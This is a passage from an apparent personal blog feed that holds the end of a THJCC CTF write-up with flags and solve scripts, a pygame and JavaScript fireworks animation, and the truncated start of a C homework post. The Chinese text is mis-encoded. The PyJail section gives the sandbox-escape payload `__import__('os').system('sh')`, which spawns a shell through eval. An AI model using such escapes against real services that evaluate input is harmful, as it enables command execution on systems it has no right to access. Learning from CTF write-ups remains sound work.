&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from Crypto.Util.number import long_to_bytes
flag = FLAG = 10730390416708814647386325276467849806006354580175878786363505755256613965929606057246313695
def xor1(flag):
    return flag ^ 124789
def xor2(flag):
    return flag ^ 487531
def xor3(flag):
    return flag ^ 784523
def xor4(flag):
    return flag ^ 642871
def xor5(flag):
    return flag ^ 474745
count = 0
count += 1
if count == 1:
    flag = xor1(flag)
    count += 2
    if count == 3:
        flag = xor2(flag)
        count += 1
    if count == 4:
        flag = xor3(flag)
        count -= 2
    else:
        flag = xor2(flag)
        count += 1
else:
    flag = xor3(flag)
    count += 5
if count == 2:
    flag = xor4(flag)
elif count == 6:
    flag = xor5(flag)
print(long_to_bytes(flag))
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:THJCC{pyc_rev3r3e_C3n_u32_on1i5e_t0Ol}
THJCC CTF&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h1&gt;Pwn&lt;/h1&gt;
&lt;h2&gt;nc&lt;/h2&gt;
&lt;p&gt;ÈÄ£‰∏äncÂæå‰ªñÊúÉÂïè‰Ω†&lt;code&gt;Never Gonna Give You Up&lt;/code&gt;ÁöÑ‰ΩúËÄÖÊòØË™∞&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:THJCC{N3veR_g0nn4_l37_You_dOwn!!!}
THJCC CTF&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;NPSC&lt;/h2&gt;
&lt;p&gt;ÊàëÁî®ÂûÉÂúæÂØ´Ê≥ïÂØ´Âæó
ÈÅãÁÆó‰πã‰πÖËÆìÊàëÊÑüÂà∞ÁñëÊÉë&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from pwn import *
def max_score(balls):
    if not balls:
        return 0
    max_score = 0
    for i in range(len(balls)):
        score = balls[i]
        remaining_balls = balls[i+1:]
        for j in range(len(remaining_balls)):
            if score &amp;gt;= remaining_balls[j]:
                score += remaining_balls[j]
            else:
                break
        max_score = max(max_score, score)
    return max_score

io = remote(&amp;#39;23.146.248.36&amp;#39;, 30003)
io.recvlines(4)

for round_ in range(3):
    print(f&amp;#39;=============== ROUND {round_+1} ===============&amp;#39;)
    if round_ in [1, 2]:
    for _ in range(10):
        numbers = eval(io.recvline().decode().strip())
        io.sendline(str(max_score(numbers)).encode())
        result = io.recvline().decode().strip()
        print(f&amp;#39;Input: {numbers}&amp;#39;)
        print(f&amp;#39;Output: {result}&amp;#39;)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h1&gt;Crypto&lt;/h1&gt;
&lt;h2&gt;ÂçöÂÖÉÂ©¶Áî¢Áßë&lt;/h2&gt;
&lt;p&gt;ÂÖ∂ÂØ¶‰πüÂ∞±Ëß£ÂØÜÈÄôÂÄã&lt;code&gt;TUFDVlZ7cFBwLnU0VXJmVGQzay52MEYubVB9Cg==&lt;/code&gt;
ÂÖàÊÜëÁõ¥Ë¶∫ÔºåBase64ÂõûÂéª
&lt;img src=&quot;https://hackmd.io/_uploads/Sy1pby_MR.png&quot; alt=&quot;image&quot;&gt;
Á¢∫ÂØ¶Ê†ºÂºèÊúâÂ∞çÔºåÁÑ∂ÂæåË©¶Ë©¶ÁúãÊòØ‰∏çÊòØÂá±Ëñ©
‰∏ÄÂÄã‰∏ÄÂÄãtryÊúÉÁôºÁèæÊòØ‰ΩçÁßª19ÂÄã
&lt;img src=&quot;https://hackmd.io/_uploads/By58Gydf0.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:THJCC{wWw.b4BymAk3r.c0M.tW}
THJCC CTF&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;Baby RSA&lt;/h2&gt;
&lt;p&gt;Âè™Ë¶ÅÁî®Á∑ö‰∏äÁöÑrsa decoderÂ∞±Â•Ω‰∫Ü
&lt;img src=&quot;https://hackmd.io/_uploads/Sy0P8ddz0.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:THJCC{small_eeeee_can_be_pwned_easily}
THJCC CTF&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;„ÄäSSS.GRIDMAN„Äã&lt;/h2&gt;
&lt;p&gt;Âú®È°åÁõÆ‰∏≠ÁúãÂà∞ÊúÉÁîüÊàê‰∫åÊ¨°ÊñπÁ®ãÂºèÁöÑÊ®£Â≠ê&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def random_ploy():
    poly=[]
    for i in range(2):
        poly.append(random.randint(99,999))
    return poly
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;polyc&lt;/code&gt; Ë¢´ÂÆöÁæ©ÁÇ∫ÈÄôÂÖ©ÂÄã‰øÇÊï∏Âä†‰∏ä&lt;code&gt;secret&lt;/code&gt;Áî®ÊàêÂ∏∏Êï∏È†ÖÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;polyc =random_ploy()
polyc.append(secret)
poly_enc = numpy.poly1d(polyc)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;numpy.poly1d(polyc)&lt;/code&gt; ÊúÉ return &lt;code&gt;ax^2 + bx + c&lt;/code&gt; ÁöÑ‰∫åÊ¨°ÊñπÁ®ãÂºèÔºåÂÖ∂‰∏≠ &lt;code&gt;a&lt;/code&gt; Âíå &lt;code&gt;b&lt;/code&gt; ÊòØÈö®Ê©üÁöÑÔºå&lt;code&gt;c&lt;/code&gt; ÊòØ&lt;code&gt;secret&lt;/code&gt;
&lt;code&gt;f(x_value, y_value, x)&lt;/code&gt; Áµ¶ÂÆö‰∏ÄÁ≥ªÂàóÁöÑË≥áÊñôÈªû&lt;code&gt;Ôºàx_value, y_valueÔºâ&lt;/code&gt;ÔºåÂáΩÊï∏Ë®àÁÆó‰∫ÜÂ§öÈ†ÖÂºèÂú® x ÈªûÁöÑÂÄº„ÄÇ
ÂÖ∂‰∏≠Ôºå&lt;code&gt;shares&lt;/code&gt;ÊòØÈ°åÁõÆÁµ¶ÊàëÁöÑË≥áÊñôÈªûÔºåÂ∞±ÂèØ‰ª•ÊâæÂà∞‰∫Ü„ÄÇ
Á∏ΩÈ´îËÄåÁèæ Â∞±ÊòØËóâÁî±‰∏âÂÄãÈªûÊâæÂà∞ÊñπÁ®ãÂºèÁöÑÂ∏∏Êï∏È†ÖËÄåÂ∑≤„ÄÇ
&lt;a href=&quot;https://highscope.ch.ntu.edu.tw/wordpress/?tags=%E6%8B%89%E6%A0%BC%E6%9C%97%E6%97%A5%E6%8F%92%E5%80%BC%E5%A4%9A%E9%A0%85%E5%BC%8F&quot;&gt;ÂèÉËÄÉÊñáÁçªÔºöÊãâÊ†ºÊúóÊó•ÊèíÂÄºÂ§öÈ†ÖÂºè&lt;/a&gt;
Ëß£Ê±∫Á®ãÂºèÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def f(x_value, y_value, x):
    result = 0
    for i in range(len(x_value)):
        temp = y_value[i]
        for j in range(len(x_value)):
            if j != i:
                temp = temp * (x - x_value[j]) / (x_value[i] - x_value[j])
        result += temp
    return result
shares = [(139, 3875728327), (982, 4473718807), (707, 4179926407)] #ÊääÈªûÈªû‰∏üÈÄ≤‰æÜ
x_value, y_value = zip(*shares)
secret = f(x_value, y_value, 0)
print(&amp;quot;ÂØÜÁ¢ºÊòØÔºö&amp;quot;, int(secret))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rJJeyq_z0.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:THJCC{SSS_1s_a_c001_w2y_t0_pr0t3c7_s3c23t}
THJCC CTF&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h1&gt;Misc&lt;/h1&gt;
&lt;h2&gt;ÂéüÁ•ûÂ∏≥ËôüÂ§ñÊµÅ&lt;/h2&gt;
&lt;p&gt;ÊúÉÊúâ‰∏ÄÂÄãÁôªÂÖ•‰ªãÈù¢ÔºåË¶ÅÂæûÁ∂≤Ë∑ØÂ∞ÅÂåÖÂéªÊäìÂèñ
&lt;img src=&quot;https://hackmd.io/_uploads/Hky-68Df0.png&quot; alt=&quot;image&quot;&gt;
ÊâìÈñãÂ∞ÅÂåÖ‰æÜÁúãÔºåÊØè‰∏ÄÁµÑÈÉΩË©¶‰∏ÄÈÅçÔºåFLAGÂ∞±Âô¥Âá∫‰æÜ‰∫Ü
&lt;img src=&quot;https://hackmd.io/_uploads/HyCP08PMR.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;THJCC{W3r3_sHarKKKKKK_MasT3R_C8763}&lt;/code&gt;
THJCC CTF&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;PyJail-0&lt;/h2&gt;
&lt;p&gt;ÈÄôÊòØÈ°åÁõÆÂü∑Ë°åÁ®ãÂºè&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python=&quot;&gt;
WELCOME=&amp;#39;&amp;#39;&amp;#39;
 ____            _       _ _
|  _ \ _   _    | | __ _(_) |
| |_) | | | |_  | |/ _` | | |
|  __/| |_| | |_| | (_| | | |
|_|    \__, |\___/ \__,_|_|_|
       |___/
&amp;#39;&amp;#39;&amp;#39;

def main():

    print(&amp;quot;-&amp;quot;*30)
    print(WELCOME)
    print(&amp;quot;-&amp;quot;*30)
    print(&amp;quot;Try to escape!!This is a jail&amp;quot;)
    a=input(&amp;quot;&amp;gt; &amp;quot;)
    eval(a)

if __name__ == &amp;#39;__main__&amp;#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÊúÉÁôºÁèæÂè™Ë¶ÅËÉΩË∑≥ÈÅéÂ∞±ÂèØ‰ª•
ÊâÄ‰ª•Âè™Ë¶ÅËº∏ÂÖ•&lt;code&gt;eval(input())&lt;/code&gt;
ÁÑ∂ÂæåÊãøÂà∞Â≠òÂèñÁöÑÊñπÂºè&lt;code&gt;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;sh&amp;#39;)&lt;/code&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/HySEzPwMR.png&quot; alt=&quot;image&quot;&gt;
ÈÄôÊ®£Â∞±ÊãøÂà∞‰∫Ü&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:THJCC{Use_M2g1c_f2un3ti0n_in_P9Ja1l!!}
THJCC CTF&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;PyJail-1&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-python=&quot;&gt;WELCOME=&amp;#39;&amp;#39;&amp;#39;
 ____            _       _ _
|  _ \ _   _    | | __ _(_) |
| |_) | | | |_  | |/ _` | | |
|  __/| |_| | |_| | (_| | | |
|_|    \__, |\___/ \__,_|_|_|
       |___/
&amp;#39;&amp;#39;&amp;#39;

def main():
    try:
        print(&amp;quot;-&amp;quot;*30)
        print(WELCOME)
        print(&amp;quot;-&amp;quot;*30)
        print(&amp;quot;Try to escape!!This is a jail&amp;quot;)
        print(&amp;quot;I increased security!!!&amp;quot;)
        a=input(&amp;quot;&amp;gt; &amp;quot;)
        if len(a)&amp;lt;15:
            eval(a)
        else:
            print(&amp;quot;Don&amp;#39;t escape!!&amp;quot;)
    except:
        print(&amp;quot;error&amp;quot;)
        exit()

if __name__ == &amp;#39;__main__&amp;#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÊÑüË¶∫Áõ∏ËºÉ‰∏ä‰∏ÄÈ°åËÆäË§áÈõú‰∫ÜÔºå‰ΩÜÊòØÁî®Âêå‰∏ÄÂÄãÁ≠ñÁï•ÈÇÑÊòØË°åÁöÑÈÄö
&lt;img src=&quot;https://hackmd.io/_uploads/ryCNU3DzR.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:THJCC{Inp3t_b9p2sss_lim1t_1n+p3j2i1!}
THJCC CTF&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Mon, 29 Apr 2024 01:41:54 GMT</pubDate></item><item><title>codeÁÖôÁÅ´</title><link>https://yih-0118.github.io/blog/code%E7%85%99%E7%81%AB/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/code%E7%85%99%E7%81%AB/</guid><description>ËÅΩÂà∞Êâì‰∏äËä±ÁÅ´Â∞±ÂØ´‰∫Ü</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/code%E7%85%99%E7%81%AB/&quot;&gt;https://yih-0118.github.io/blog/code%E7%85%99%E7%81%AB/&lt;/a&gt;&lt;/blockquote&gt; &lt;ul&gt;
&lt;li&gt;&lt;p&gt;Âè™ÊòØÂÄãÁÖôÁÅ´&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;pythonÁâàÊú¨&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import pygame
import random
import math

vector = pygame.math.Vector2

gravity = vector(0, 0.3)
DISPLAY_WIDTH = DISPLAY_HEIGHT = 800

trail_colours = [(45, 45, 45), (60, 60, 60), (75, 75, 75), (125, 125, 125), (150, 150, 150)]
dynamic_offset = 1
static_offset = 3

MAX_FIREWORKS = 200
MAX_PARTICLES = 5000

class Firework:
    def __init__(self):
        self.colour = (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
        self.colours = (
            (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)),
            (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)),
            (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
        self.firework = Particle(random.randint(0, DISPLAY_WIDTH), DISPLAY_HEIGHT, True,
                                 self.colour)
        self.exploded = False
        self.particles = []
        self.min_max_particles = (100, 225)

    def uppubDate(self, win):
        if not self.exploded:
            self.firework.apply_force(gravity)
            self.firework.move()
            for tf in self.firework.trails:
                tf.show(win)

            self.show(win)

            if self.firework.vel.y &amp;gt;= 0:
                self.exploded = True
                self.explode()
        else:
            for particle in self.particles:
                particle.apply_force(vector(gravity.x + random.uniform(-1, 1) / 20, gravity.y / 2 + (random.randint(1, 8) / 100)))
                particle.move()
                for t in particle.trails:
                    t.show(win)
                particle.show(win)

    def explode(self):
        amount = random.randint(*self.min_max_particles)
        for i in range(amount):
            self.particles.append(Particle(self.firework.pos.x, self.firework.pos.y, False, self.colours))

    def show(self, win):
        pygame.draw.circle(win, self.colour, (int(self.firework.pos.x), int(self.firework.pos.y)), self.firework.size)

    def remove(self):
        if self.exploded:
            for p in self.particles:
                if p.remove is True:
                    self.particles.remove(p)

            if len(self.particles) == 0:
                return True
            else:
                return False

class Particle:
    def __init__(self, x, y, firework, colour):
        self.firework = firework
        self.pos = vector(x, y)
        self.origin = vector(x, y)
        self.radius = 20
        self.remove = False
        self.explosion_radius = random.randint(5, 18)
        self.life = 0
        self.acc = vector(0, 0)
        self.trails = []
        self.prev_posx = [-10] * 10
        self.prev_posy = [-10] * 10

        if self.firework:
            self.vel = vector(0, -random.randint(17, 20))
            self.size = 5
            self.colour = colour
            for i in range(5):
                self.trails.append(Trail(i, self.size, True))
        else:
            self.vel = vector(random.uniform(-1, 1), random.uniform(-1, 1))
            self.vel.x *= random.randint(3, self.explosion_radius)
            self.vel.y *= random.randint(3, self.explosion_radius)
            self.size = random.randint(2, 4)
            self.colour = random.choice(colour)
            for i in range(5):
                self.trails.append(Trail(i, self.size, False))

    def apply_force(self, force):
        self.acc += force

    def move(self):
        if not self.firework:
            self.vel.x *= 0.9
            self.vel.y *= 0.9
        self.vel += self.acc
        self.pos += self.vel
        self.acc *= 0

        if self.life == 0 and not self.firework:
            distance = math.sqrt((self.pos.x - self.origin.x) ** 2 + (self.pos.y - self.origin.y) ** 2)
            if distance &amp;gt; self.explosion_radius:
                self.remove = True

        if self.vel.length() &amp;lt; 0.5:
            self.remove = True

        self.decay()

        self.trail_uppubDate()

        self.life += 1

    def show(self, win):
        pygame.draw.circle(win, (self.colour[0], self.colour[1], self.colour[2], 0), (int(self.pos.x), int(self.pos.y)),
                           self.size)

    def decay(self):
        if 50 &amp;gt; self.life &amp;gt; 10:
            ran = random.randint(0, 30)
            if ran == 0:
                self.remove = True
        elif self.life &amp;gt; 50:
            ran = random.randint(0, 5)
            if ran == 0:
                self.remove = True

    def trail_uppubDate(self):
        self.prev_posx.pop()
        self.prev_posx.insert(0, int(self.pos.x))
        self.prev_posy.pop()
        self.prev_posy.insert(0, int(self.pos.y))

        for n, t in enumerate(self.trails):
            if t.dynamic:
                t.get_pos(self.prev_posx[n + dynamic_offset], self.prev_posy[n + dynamic_offset])
            else:
                t.get_pos(self.prev_posx[n + static_offset], self.prev_posy[n + static_offset])

class Trail:
    def __init__(self, n, size, dynamic):
        self.pos_in_line = n
        self.pos = vector(-10, -10)
        self.dynamic = dynamic

        if self.dynamic:
            self.colour = trail_colours[n]
            self.size = int(size - n / 2)
        else:
            self.colour = (255, 255, 200)
            self.size = size - 2
            if self.size &amp;lt; 0:
                self.size = 0

    def get_pos(self, x, y):
        self.pos = vector(x, y)

    def show(self, win):
        pygame.draw.circle(win, self.colour, (int(self.pos.x), int(self.pos.y)), self.size)

def uppubDate(win, fireworks):
    to_remove = []
    for fw in fireworks:
        fw.uppubDate(win)
        if fw.remove():
            to_remove.append(fw)

    for fw in to_remove:
        fireworks.remove(fw)

    pygame.display.uppubDate()

def main():
    pygame.init()
    pygame.font.init()
    pygame.display.set_caption(&amp;quot;HI&amp;quot;)

    win = pygame.display.set_mode((DISPLAY_WIDTH, DISPLAY_HEIGHT))
    clock = pygame.time.Clock()

    fireworks = [Firework() for i in range(2)]
    running = True

    while running:
        clock.tick(60)
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_1:
                    if len(fireworks) &amp;lt; MAX_FIREWORKS:
                        fireworks.append(Firework())
                if event.key == pygame.K_2:
                    for i in range(10):
                        if len(fireworks) &amp;lt; MAX_FIREWORKS:
                            fireworks.append(Firework())
                if event.key == pygame.K_3:
                    for i in range(100):
                        if len(fireworks) &amp;lt; MAX_FIREWORKS:
                            fireworks.append(Firework())
        win.fill((20, 20, 30))

        if random.randint(0, 20) == 1 and len(fireworks) &amp;lt; MAX_FIREWORKS:
            fireworks.append(Firework())

        total_particles = sum(len(fw.particles) for fw in fireworks)
        if total_particles &amp;gt; MAX_PARTICLES:
            for fw in fireworks:
                fw.particles = fw.particles[:MAX_PARTICLES // len(fireworks)]

        uppubDate(win, fireworks)

    pygame.quit()
    quit()

if __name__ == &amp;#39;__main__&amp;#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;javascriptÁâàÊú¨&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const canvas = document.createElement(&amp;#39;canvas&amp;#39;);
const ctx = canvas.getContext(&amp;#39;2d&amp;#39;);
document.body.appendChild(canvas);

const gravity = { x: 0, y: 0.3 };
const DISPLAY_WIDTH = 800;
const DISPLAY_HEIGHT = 800;

const trail_colours = [
    [45, 45, 45],
    [60, 60, 60],
    [75, 75, 75],
    [125, 125, 125],
    [150, 150, 150]
];
const dynamic_offset = 1;
const static_offset = 3;

const MAX_FIREWORKS = 200;
const MAX_PARTICLES = 5000;

class Firework {
    constructor() {
        this.colour = [
            Math.floor(Math.random() * 256),
            Math.floor(Math.random() * 256),
            Math.floor(Math.random() * 256)
        ];
        this.colours = [
            [
                Math.floor(Math.random() * 256),
                Math.floor(Math.random() * 256),
                Math.floor(Math.random() * 256)
            ],
            [
                Math.floor(Math.random() * 256),
                Math.floor(Math.random() * 256),
                Math.floor(Math.random() * 256)
            ],
            [
                Math.floor(Math.random() * 256),
                Math.floor(Math.random() * 256),
                Math.floor(Math.random() * 256)
            ]
        ];
        this.firework = new Particle(
            Math.floor(Math.random() * DISPLAY_WIDTH),
            DISPLAY_HEIGHT,
            true,
            this.colour
        );
        this.exploded = false;
        this.particles = [];
        this.min_max_particles = [100, 225];
    }

    uppubDate() {
        if (!this.exploded) {
            this.firework.apply_force(gravity);
            this.firework.move();
            this.firework.show();
            if (this.firework.vel.y &amp;gt;= 0) {
                this.exploded = true;
                this.explode();
            }
        } else {
            for (const particle of this.particles) {
                particle.apply_force({
                    x: gravity.x + (Math.random() - 0.5) / 20,
                    y: gravity.y / 2 + (Math.floor(Math.random() * 8) + 1) / 100
                });
                particle.move();
                particle.show();
            }
        }
    }

    explode() {
        const amount = Math.floor(
            Math.random() * (this.min_max_particles[1] - this.min_max_particles[0] + 1) +
            this.min_max_particles[0]
        );
        for (let i = 0; i &amp;lt; amount; i++) {
            this.particles.push(
                new Particle(this.firework.pos.x, this.firework.pos.y, false, this.colours)
            );
        }
    }

    remove() {
        if (this.exploded) {
            this.particles = this.particles.filter((p) =&amp;gt; !p.remove);
            return this.particles.length === 0;
        }
        return false;
    }
}

class Particle {
    constructor(x, y, firework, colour) {
        this.firework = firework;
        this.pos = { x, y };
        this.origin = { x, y };
        this.radius = 20;
        this.remove = false;
        this.explosion_radius = Math.floor(Math.random() * 14) + 5;
        this.life = 0;
        this.acc = { x: 0, y: 0 };
        this.trails = [];
        this.prev_posx = Array(10).fill(-10);
        this.prev_posy = Array(10).fill(-10);

        if (this.firework) {
            this.vel = { x: 0, y: -Math.floor(Math.random() * 4) - 17 };
            this.size = 5;
            this.colour = colour;
            for (let i = 0; i &amp;lt; 5; i++) {
                this.trails.push(new Trail(i, this.size, true));
            }
        } else {
            this.vel = {
                x: (Math.random() - 0.5) * 2 * Math.floor(Math.random() * this.explosion_radius),
                y: (Math.random() - 0.5) * 2 * Math.floor(Math.random() * this.explosion_radius)
            };
            this.size = Math.floor(Math.random() * 3) + 2;
            this.colour = colour[Math.floor(Math.random() * colour.length)];
            for (let i = 0; i &amp;lt; 5; i++) {
                this.trails.push(new Trail(i, this.size, false));
            }
        }
    }

    apply_force(force) {
        this.acc.x += force.x;
        this.acc.y += force.y;
    }

    move() {
        if (!this.firework) {
            this.vel.x *= 0.9;
            this.vel.y *= 0.9;
        }
        this.vel.x += this.acc.x;
        this.vel.y += this.acc.y;
        this.pos.x += this.vel.x;
        this.pos.y += this.vel.y;
        this.acc.x = 0;
        this.acc.y = 0;

        if (this.life === 0 &amp;amp;&amp;amp; !this.firework) {
            const distance = Math.sqrt(
                (this.pos.x - this.origin.x) ** 2 + (this.pos.y - this.origin.y) ** 2
            );
            if (distance &amp;gt; this.explosion_radius) {
                this.remove = true;
            }
        }

        if (Math.abs(this.vel.x) &amp;lt; 0.5 &amp;amp;&amp;amp; Math.abs(this.vel.y) &amp;lt; 0.5) {
            this.remove = true;
        }

        this.decay();
        this.trail_uppubDate();
        this.life++;
    }

    show() {
        ctx.beginPath();
        ctx.arc(this.pos.x, this.pos.y, this.size, 0, Math.PI * 2);
        ctx.fillStyle = `rgba(${this.colour[0]}, ${this.colour[1]}, ${this.colour[2]}, 1)`;
        ctx.fill();
    }

    decay() {
        if (this.life &amp;gt; 10 &amp;amp;&amp;amp; this.life &amp;lt; 50 &amp;amp;&amp;amp; Math.random() &amp;lt; 0.03) {
            this.remove = true;
        } else if (this.life &amp;gt;= 50 &amp;amp;&amp;amp; Math.random() &amp;lt; 0.2) {
            this.remove = true;
        }
    }

    trail_uppubDate() {
        this.prev_posx.pop();
        this.prev_posx.unshift(this.pos.x);
        this.prev_posy.pop();
        this.prev_posy.unshift(this.pos.y);

        for (let n = 0; n &amp;lt; this.trails.length; n++) {
            const t = this.trails[n];
            if (t.dynamic) {
                t.get_pos(this.prev_posx[n + dynamic_offset], this.prev_posy[n + dynamic_offset]);
            } else {
                t.get_pos(this.prev_posx[n + static_offset], this.prev_posy[n + static_offset]);
            }
        }
    }
}

class Trail {
    constructor(n, size, dynamic) {
        this.pos_in_line = n;
        this.pos = { x: -10, y: -10 };
        this.dynamic = dynamic;

        if (this.dynamic) {
            this.colour = `rgb(${trail_colours[n][0]}, ${trail_colours[n][1]}, ${trail_colours[n][2]})`;
            this.size = size - n / 2;
        } else {
            this.colour = &amp;#39;rgb(255, 255, 200)&amp;#39;;
            this.size = size - 2;
            if (this.size &amp;lt; 0) {
                this.size = 0;
            }
        }
    }

    get_pos(x, y) {
        this.pos = { x, y };
    }

    show() {
        ctx.beginPath();
        ctx.arc(this.pos.x, this.pos.y, this.size, 0, Math.PI * 2);
        ctx.fillStyle = this.colour;
        ctx.fill();
    }
}

function uppubDate(fireworks) {
    const to_remove = [];
    fireworks.forEach((fw) =&amp;gt; {
        fw.uppubDate();
        if (fw.remove()) {
            to_remove.push(fw);
        }
    });

    to_remove.forEach((fw) =&amp;gt; {
        const index = fireworks.indexOf(fw);
        fireworks.splice(index, 1);
    });
}

function main() {
    canvas.width = DISPLAY_WIDTH;
    canvas.height = DISPLAY_HEIGHT;

    const fireworks = Array.from({ length: 2 }, () =&amp;gt; new Firework());

    setInterval(() =&amp;gt; {
        if (fireworks.length &amp;lt; MAX_FIREWORKS &amp;amp;&amp;amp; Math.random() &amp;lt; 0.05) {
            fireworks.push(new Firework());
        }
    }, 100);

    setInterval(() =&amp;gt; {
        if (fireworks.length &amp;lt; MAX_FIREWORKS &amp;amp;&amp;amp; Math.random() &amp;lt; 0.1) {
            for (let i = 0; i &amp;lt; 10; i++) {
                if (fireworks.length &amp;lt; MAX_FIREWORKS) {
                    fireworks.push(new Firework());
                }
            }
        }
    }, 500);

    setInterval(() =&amp;gt; {
        if (fireworks.length &amp;lt; MAX_FIREWORKS &amp;amp;&amp;amp; Math.random() &amp;lt; 0.2) {
            for (let i = 0; i &amp;lt; 100; i++) {
                if (fireworks.length &amp;lt; MAX_FIREWORKS) {
                    fireworks.push(new Firework());
                }
            }
        }
    }, 1000);

    function animate() {
        ctx.fillStyle = &amp;#39;rgba(20, 20, 30, 0.2)&amp;#39;;
        ctx.fillRect(0, 0, DISPLAY_WIDTH, DISPLAY_HEIGHT);
        uppubDate(fireworks);
        requestAnimationFrame(animate);
    }

    animate();
}

main();
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Sun, 31 Mar 2024 06:51:53 GMT</pubDate></item><item><title>Programming Security March Homework</title><link>https://yih-0118.github.io/blog/isip-2024-mar/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/isip-2024-mar/</guid><description>Á¥ÄÈåÑË™≤Á®ã‰ΩúÊ•≠</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/isip-2024-mar/&quot;&gt;https://yih-0118.github.io/blog/isip-2024-mar/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BJvnFpJO0.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h2&gt;‰ΩúÊ•≠1-¬†C Ë™ûË®ÄÈñãÁôº&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;printf(&amp;quot;%d\\n&amp;quot;, a &amp;amp; b);&lt;/code&gt;
ÈÄô‰∏ÄË°åÂü∑Ë°å‰∫ÜANDÈÅãÁÆó„ÄÇaÂíåbÁöÑ‰∫åÈÄ≤‰ΩçË°®Á§∫ÂàÜÂà•ÊòØ1001Âíå1101ÔºåÈÄ≤Ë°å‰ΩçÂÖÉANDÈÅãÁÆóÂæåÔºåÂæóÂà∞ÁµêÊûú1001ÔºåÂ∞çÊáâÁöÑÂçÅÈÄ≤‰ΩçÊï∏Â≠óÁÇ∫9„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;printf(&amp;quot;%d\\n&amp;quot;, a || b);&lt;/code&gt;
ÈÄô‰∏ÄË°åÂü∑Ë°å‰∫ÜORÈÅãÁÆó„ÄÇaÂíåbÈÉΩÊòØÈùûÈõ∂ÂÄºÔºåÂõ†Ê≠§Ë°®ÈÅîÂºèa || bÁöÑÁµêÊûúÁÇ∫ÁúüÔºà1Ôºâ„ÄÇÊâÄ‰ª•Ëº∏Âá∫Â∞áÊòØ1„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;printf(&amp;quot;%d\\n&amp;quot;, a ^ b);&lt;/code&gt;
ÈÄô‰∏ÄË°åÂü∑Ë°å‰∫Ü‰ΩçÂÖÉXORÈÅãÁÆó„ÄÇaÂíåbÁöÑ‰∫åÈÄ≤‰ΩçË°®Á§∫ÂàÜÂà•ÊòØ1001Âíå1101ÔºåÈÄ≤Ë°å‰ΩçÂÖÉXORÈÅãÁÆóÂæåÔºåÂæóÂà∞ÁµêÊûú0100ÔºåÂ∞çÊáâÁöÑÂçÅÈÄ≤‰ΩçÊï∏Â≠óÁÇ∫4„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;printf(&amp;quot;%d\\n&amp;quot;, !a);&lt;/code&gt;
